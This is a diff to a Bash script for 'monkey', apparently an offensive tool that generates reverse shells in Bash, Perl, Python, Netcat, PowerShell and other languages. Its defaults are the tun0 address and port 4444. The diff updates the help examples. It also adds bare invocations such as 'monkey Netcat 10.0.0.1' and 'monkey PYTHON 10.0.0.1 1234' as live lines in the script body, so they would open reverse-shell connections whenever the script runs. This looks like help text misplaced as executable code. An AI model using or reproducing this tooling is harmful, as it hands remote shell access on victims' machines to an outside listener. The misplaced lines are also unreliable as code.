@@ -5,7 +5,12 @@ cp ./monkey_payloads ~/.monkey_payloads;
 cp ./monkey /usr/bin/monkey
 echo hello;
 fi
-
+  monkey
+  monkey bash
+  monkey power 10.0.0.1 1234 
+  monkey Netcat 10.0.0.1
+  monkey PYTHON 10.0.0.1 1234
+  monkey TTY
 type_arr+=( BASH PERL PYTHON PYTHON3 PHP RUBY NETCAT JAVA TTY POWERSHELL );
 if [ "$1" = "-h" ] || [ "$1" = "--help" ];then
 	echo -e "monkey v2.0 (c) 28-12-2020 by \e[1;36mTHEC4R3T4K3R\e[0m - Please do not use in military or secret service organizations, or for illegal purposes.";
@@ -15,7 +20,7 @@ if [ "$1" = "-h" ] || [ "$1" = "--help" ];then
 	echo -e "  -l, --list                  list all available types.";
 	echo -e "      --purge                 remove monkey.";
 	echo -ne "\n  Note: \e[1;36m'monkey' with even no arguments works!!\e[0m \n\t Default Type:Netcat, IP:\e[1;36mtun0\e[0m, Port:4444, Shell-type:bash.";
-	echo -e "\nExamples:\n  monkey \n  monkey Bash \n  monkey Netcat 10.0.0.1 \n  monkey Python 10.0.0.1 1234\n  monkey Python 10.0.0.1 1234 zsh \n  monkey TTY";
+	echo -e "\nExamples:\n  monkey \n  monkey bash \n  monkey power 10.0.0.1 \n  monkey Netcat 10.0.0.1 1234\n  monkey PYTHON 10.0.0.1 1234 zsh \n  monkey TTY";
 elif [ "$1" = "-l" ] || [ "$1" = "--list" ];then
 	echo -ne "Available types in monkey v1.0: \n  ";
 	for type in ${type_arr[@]}
